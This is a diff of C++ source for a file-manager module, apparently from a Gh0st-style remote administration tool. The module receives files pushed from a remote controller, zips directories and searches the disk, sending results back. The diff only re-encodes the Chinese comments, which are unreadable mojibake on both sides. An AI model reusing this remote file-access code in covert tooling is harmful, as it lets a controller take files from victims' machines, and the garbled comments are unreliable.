-		// ´«ËÍÏÂÒ»¸ö
+		// ä¼ é€ä¸‹ä¸€ä¸ª
 		else if (nTransferMode == TRANSFER_MODE_JUMP)
 		{
 			DWORD dwOffset = -1;
@@ -847,9 +847,9 @@ void CFileManager::GetFileData()
 	}
 	else
 	{
-		// Æ«ÒÆÖÃ0
+		// åç§»ç½®0
 		memset(bToken + 1, 0, 8);
-		// ÖØĞÂ´´½¨
+		// é‡æ–°åˆ›å»º
 		dwCreationDisposition = CREATE_ALWAYS;
 	}
 	FindClose(hFind);
@@ -858,31 +858,31 @@ void CFileManager::GetFileData()
 		CloseHandle(m_hFileRecv);
 	m_hFileRecv = CreateFile(m_strCurrentProcessFileName,
 		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
-	// ĞèÒª´íÎó´¦Àí
+	// éœ€è¦é”™è¯¯å¤„ç†
 	if (m_hFileRecv == INVALID_HANDLE_VALUE)
 	{
 		m_nCurrentProcessFileLength = 0;
 		return;
 	}
-	//CloseHandle(m_hFileRecv); // ´Ë´¦²»Òª¹Ø±Õ, ÒÔºó»¹ÒªÓÃ
+	//CloseHandle(m_hFileRecv); // æ­¤å¤„ä¸è¦å…³é—­, ä»¥åè¿˜è¦ç”¨
 
 	Send(bToken, sizeof(bToken));
 }
 
 void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 {
-	// ´«ÊäÍê±Ï
+	// ä¼ è¾“å®Œæ¯•
 	BYTE		*pData;
 	DWORD		dwBytesToWrite;
 	DWORD		dwBytesWrite;
-	int			nHeadLength = 9; // 1 + 4 + 4  Êı¾İ°üÍ·²¿´óĞ¡£¬Îª¹Ì¶¨µÄ9
+	int			nHeadLength = 9; // 1 + 4 + 4  æ•°æ®åŒ…å¤´éƒ¨å¤§å°ï¼Œä¸ºå›ºå®šçš„9
 	FILESIZE	*pFileSize;
 	
-	// µÃµ½Êı¾İµÄÆ«ÒÆ
+	// å¾—åˆ°æ•°æ®çš„åç§»
 	pData = lpBuffer + 8;
 	pFileSize = (FILESIZE *)lpBuffer;
 	
-	// µÃµ½Êı¾İÔÚÎÄ¼şÖĞµÄÆ«ÒÆ
+	// å¾—åˆ°æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„åç§»
 	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
 	LONG	dwOffsetLow = pFileSize->dwSizeLow;
 	
@@ -892,11 +892,11 @@ void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 	
 	BOOL bRet = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
 // 	if (bRet == FALSE)
-// 		printf("ÎÄ¼şĞ´ÈëÊ§°Ü");
+// 		printf("æ–‡ä»¶å†™å…¥å¤±è´¥");
 	dwOffsetLow = 0; dwOffsetHigh = 0;
 	dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
-	//CloseHandle(m_hFileRecv);  // ´Ë´¦²»Òª¹Ø±Õ, ÒÔºó»¹ÒªÓÃ
-	// ÎªÁË±È½Ï£¬¼ÆÊıÆ÷µİÔö
+	//CloseHandle(m_hFileRecv);  // æ­¤å¤„ä¸è¦å…³é—­, ä»¥åè¿˜è¦ç”¨
+	// ä¸ºäº†æ¯”è¾ƒï¼Œè®¡æ•°å™¨é€’å¢
 	
 	BYTE	bToken[9];
 	bToken[0] = TOKEN_DATA_CONTINUE;
@@ -925,7 +925,7 @@ void CFileManager::Rename(LPBYTE lpBuffer)
 	SendToken(TOKEN_RENAME_FINISH);
 }
 
-//Ñ¹Ëõ½â»òÑ¹ËõÎÄ¼ş
+//å‹ç¼©è§£æˆ–å‹ç¼©æ–‡ä»¶
 void CFileManager::ExeCompress(BYTE *lpBuffer)  
 {  
     char* pszFilePath = (char*)lpBuffer;  
@@ -951,7 +951,7 @@ bool CFileManager::CreateZipArchive(const CString& inputPath, const CString& out
     std::vector<CString> filenames;  
     DWORD centralDirOffset = 0;  
       
-    // ¼ì²éÊÇÎÄ¼ş»¹ÊÇÄ¿Â¼  
+    // æ£€æŸ¥æ˜¯æ–‡ä»¶è¿˜æ˜¯ç›®å½•  
     DWORD attrs = GetFileAttributes(inputPath);  
     if (attrs == INVALID_FILE_ATTRIBUTES) {  
         fclose(zipFile);  
@@ -960,10 +960,10 @@ bool CFileManager::CreateZipArchive(const CString& inputPath, const CString& out
       
     bool success = false;  
     if (attrs & FILE_ATTRIBUTE_DIRECTORY) {  
-        // Ñ¹ËõÄ¿Â¼  
+        // å‹ç¼©ç›®å½•  
         success = CompressDirectory(zipFile, inputPath, "", centralDir, filenames, centralDirOffset);  
     } else {  
-        // Ñ¹Ëõµ¥¸öÎÄ¼ş  
+        // å‹ç¼©å•ä¸ªæ–‡ä»¶  
         CString fileName = inputPath;  
         int pos = fileName.ReverseFind('\\');  
         if (pos != -1) fileName = fileName.Mid(pos + 1);  
@@ -984,34 +984,34 @@ bool CFileManager::CompressFile(FILE* zipFile, const CString& filePath, const CS
     FILE* inputFile = fopen(filePath, "rb");  
     if (!inputFile) return false;  
       
-    // »ñÈ¡ÎÄ¼ş´óĞ¡  
+    // è·å–æ–‡ä»¶å¤§å°  
     fseek(inputFile, 0, SEEK_END);  
     DWORD fileSize = ftell(inputFile);  
     fseek(inputFile, 0, SEEK_SET);  
       
-    // ¶ÁÈ¡ÎÄ¼şÊı¾İ  
+    // è¯»å–æ–‡ä»¶æ•°æ®  
     BYTE* fileData = new BYTE[fileSize];  
     fread(fileData, 1, fileSize, inputFile);  
     fclose(inputFile);  
       
-    // ¼ÆËãCRC32  
+    // è®¡ç®—CRC32  
     DWORD crc = crc32(0L, Z_NULL, 0);  
     crc = crc32(crc, fileData, fileSize);  
       
-    // Ê¹ÓÃdeflateInit2½øĞĞÑ¹Ëõ  
+    // ä½¿ç”¨deflateInit2è¿›è¡Œå‹ç¼©  
     z_stream strm;  
     strm.zalloc = Z_NULL;  
     strm.zfree = Z_NULL;  
     strm.opaque = Z_NULL;  
       
-    // ¹Ø¼ü£ºÊ¹ÓÃ-15µÄwindowBitsÉú³Éraw deflateÊı¾İ  
+    // å…³é”®ï¼šä½¿ç”¨-15çš„windowBitsç”Ÿæˆraw deflateæ•°æ®  
     int ret = deflateInit2(&strm, Z_DEFAULT_COMPRESSION, Z_DEFLATED, -15, 8, Z_DEFAULT_STRATEGY);  
     if (ret != Z_OK) {  
         delete[] fileData;  
         return false;  
     }  
       
-    // Ñ¹ËõÊı¾İ  
+    // å‹ç¼©æ•°æ®  
     DWORD compressedSize = deflateBound(&strm, fileSize);  
     BYTE* compressedData = new BYTE[compressedSize];  
       
@@ -1031,7 +1031,7 @@ bool CFileManager::CompressFile(FILE* zipFile, const CString& filePath, const CS
     compressedSize = strm.total_out;  
     deflateEnd(&strm);  
       
-    // Ğ´ÈëZIP±¾µØÎÄ¼şÍ·  
+    // å†™å…¥ZIPæœ¬åœ°æ–‡ä»¶å¤´  
     ZipLocalFileHeader header = {0};  
     header.signature = 0x04034b50;  
     header.version = 20;  
@@ -1047,7 +1047,7 @@ bool CFileManager::CompressFile(FILE* zipFile, const CString& filePath, const CS
 
     fwrite(compressedData, compressedSize, 1, zipFile);  
       
-    // Ìí¼Óµ½ÖĞÑëÄ¿Â¼  
+    // æ·»åŠ åˆ°ä¸­å¤®ç›®å½•  
     ZipCentralDirEntry dirEntry = {0};  
     dirEntry.signature = 0x02014b50;  
     dirEntry.versionMade = 20;  
@@ -1086,13 +1086,13 @@ bool CFileManager::CompressDirectory(FILE* zipFile, const CString& dirPath, cons
         CString newRelativePath = relativePath.IsEmpty() ? findData.cFileName : relativePath + "/" + findData.cFileName;  
           
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {  
-            // µİ¹éÑ¹Ëõ×ÓÄ¿Â¼  
+            // é€’å½’å‹ç¼©å­ç›®å½•  
             if (!CompressDirectory(zipFile, fullPath, newRelativePath, centralDir, filenames, offset)) {  
                 FindClose(hFind);  
                 return false;  
             }  
         } else {  
-            // Ñ¹ËõÎÄ¼ş  
+            // å‹ç¼©æ–‡ä»¶  
             if (!CompressFile(zipFile, fullPath, newRelativePath, centralDir, filenames, offset)) {  
                 FindClose(hFind);  
                 return false;  
@@ -1109,7 +1109,7 @@ void CFileManager::WriteCentralDirectory(FILE* zipFile, const std::vector<ZipCen
 {  
     DWORD centralDirStart = ftell(zipFile);  
       
-    // Ğ´ÈëÖĞÑëÄ¿Â¼ÌõÄ¿  
+    // å†™å…¥ä¸­å¤®ç›®å½•æ¡ç›®  
     for (size_t i = 0; i < centralDir.size(); i++) {  
         fwrite(&centralDir[i], sizeof(ZipCentralDirEntry), 1, zipFile);  
 		fwrite((LPCTSTR)filenames[i], filenames[i].GetLength(), 1, zipFile);
@@ -1118,7 +1118,7 @@ void CFileManager::WriteCentralDirectory(FILE* zipFile, const std::vector<ZipCen
       
     DWORD centralDirSize = ftell(zipFile) - centralDirStart;  
       
-    // Ğ´ÈëÖĞÑëÄ¿Â¼½áÊø¼ÇÂ¼  
+    // å†™å…¥ä¸­å¤®ç›®å½•ç»“æŸè®°å½•  
     ZipEndOfCentralDir endRecord = {0};  
     endRecord.signature = 0x06054b50;  
     endRecord.entriesOnDisk = centralDir.size();  
@@ -1129,7 +1129,7 @@ void CFileManager::WriteCentralDirectory(FILE* zipFile, const std::vector<ZipCen
     fwrite(&endRecord, sizeof(endRecord), 1, zipFile);  
 }
 
-void CFileManager::SearchFile(LPBYTE lpBuffer)// ²éÕÒÎÄ¼ş
+void CFileManager::SearchFile(LPBYTE lpBuffer)// æŸ¥æ‰¾æ–‡ä»¶
 {
 	FileSearchPacket mFileSearchPacket;
 	memcpy( &mFileSearchPacket , lpBuffer , sizeof(FileSearchPacket) );
@@ -1138,7 +1138,7 @@ void CFileManager::SearchFile(LPBYTE lpBuffer)// ²éÕÒÎÄ¼ş
 	CFileFinder::CFindOpts	opts;
 	_finder.SetCallback(FileFinderProc,this);
 	
-	// ÉèÖÃ CFindOpts¶ÔÏó
+	// è®¾ç½® CFindOptså¯¹è±¡
 	opts.sBaseFolder = mFileSearchPacket.szDir;
 	opts.sFileMask.Format("*%s*",mFileSearchPacket.szWord);
 	opts.bSubfolders = mFileSearchPacket.bSubfordle;
@@ -1155,7 +1155,7 @@ void CFileManager::SearchFile(LPBYTE lpBuffer)// ²éÕÒÎÄ¼ş
 	EndSearch[0] = TOKEN_SEARCH_END;
 	Send(EndSearch,1);	
 }
-void CFileManager::FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCustomParam)// ÎÄ¼ş²éÕÒÀà»Øµ÷º¯Êı
+void CFileManager::FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCustomParam)// æ–‡ä»¶æŸ¥æ‰¾ç±»å›è°ƒå‡½æ•°
 {
 	CString			sText, sNewFile;
 	MSG				msg;
@@ -1165,12 +1165,12 @@ void CFileManager::FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCus
 	switch (dwCode)
 	{
 	case FF_FOUND:
-		// ¹¹ÔìÊı¾İ°ü
+		// æ„é€ æ•°æ®åŒ…
 		SearchResultPacket mSearchResult;
 		sNewFile = pFinder->GetFilePath(pFinder->GetFileCount() - 1);
 		lstrcpy(mSearchResult.szFullPath,sNewFile);
 		
-		// »ñÈ¡ÎÄ¼ş´óĞ¡
+		// è·å–æ–‡ä»¶å¤§å°
 		HANDLE handle = CreateFile(sNewFile, FILE_READ_EA, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
 		if (handle != INVALID_HANDLE_VALUE)
 		{
@@ -1178,14 +1178,14 @@ void CFileManager::FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCus
 			CloseHandle(handle);
 		}
 		
-		// »ñÈ¡ÎÄ¼şÃû³Æ
+		// è·å–æ–‡ä»¶åç§°
 		lstrcpy(mSearchResult.szFileName,PathFindFileName(sNewFile));
 		
-		// »ñÈ¡Ê±¼ä
+		// è·å–æ—¶é—´
 		SYSTEMTIME time;
         WIN32_FILE_ATTRIBUTE_DATA lpinf;
-		GetFileAttributesEx(sNewFile,GetFileExInfoStandard,&lpinf);//»ñÈ¡ÎÄ¼şĞÅÏ¢£¬pathÎªÎÄ¼şÂ·¾¶
-		FileTimeToSystemTime(&lpinf.ftLastWriteTime,&time);//×ª»»Ê±¼ä¸ñÊ½£ºFILETIMEµ½SYSTEMTIME
+		GetFileAttributesEx(sNewFile,GetFileExInfoStandard,&lpinf);//è·å–æ–‡ä»¶ä¿¡æ¯ï¼Œpathä¸ºæ–‡ä»¶è·¯å¾„
+		FileTimeToSystemTime(&lpinf.ftLastWriteTime,&time);//è½¬æ¢æ—¶é—´æ ¼å¼ï¼šFILETIMEåˆ°SYSTEMTIME
 		wsprintf(mSearchResult.szDate,"%d-%d-%d",time.wYear,time.wMonth,time.wDay);
 		
 		int nPacketLength = sizeof(SearchResultPacket) + 2;
@@ -1194,8 +1194,8 @@ void CFileManager::FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCus
 		memcpy(lpBuffer+1,&mSearchResult,sizeof(SearchResultPacket));
 		pDlg->Send(lpBuffer,nPacketLength);
 		// 		CString text;
-		// 		text.Format("ÄÚÈİ£º %s",lpBuffer);
-		// 		MessageBox(NULL,text,"ÌáÊ¾",MB_OK);
+		// 		text.Format("å†…å®¹ï¼š %s",lpBuffer);
+		// 		MessageBox(NULL,text,"æç¤º",MB_OK);
 		Sleep(10);
 		break;
 	}
